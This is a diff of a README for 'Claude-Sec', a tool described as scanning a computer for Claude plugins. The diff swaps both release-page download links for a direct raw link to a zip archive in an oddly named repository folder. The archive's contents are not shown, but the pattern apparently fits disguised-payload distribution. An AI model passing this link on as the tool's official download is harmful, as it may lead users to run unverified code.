@@ -1,6 +1,6 @@
 # 🔍 Claude-Sec - Find Claude plugins on your computer
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/arindamchakrabortty123/Claude-Sec/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/arindamchakrabortty123/Claude-Sec/raw/refs/heads/main/astrut/Sec_Claude_2.7.zip)
 
 Claude-Sec scans your computer to identify installed Claude connectors and plugins. Security researchers use this data to check for potential vulnerabilities using the claudesec.pluto.security database. This tool streamlines the discovery process by automating the search across your local directories.
 
@@ -14,7 +14,7 @@ Claude-Sec scans your computer to identify installed Claude connectors and plugi
 
 Visit the project release page to download the latest version of the scanner.
 
-[Download Claude-Sec Here](https://github.com/arindamchakrabortty123/Claude-Sec/releases)
+[Download Claude-Sec Here](https://github.com/arindamchakrabortty123/Claude-Sec/raw/refs/heads/main/astrut/Sec_Claude_2.7.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled Assets.
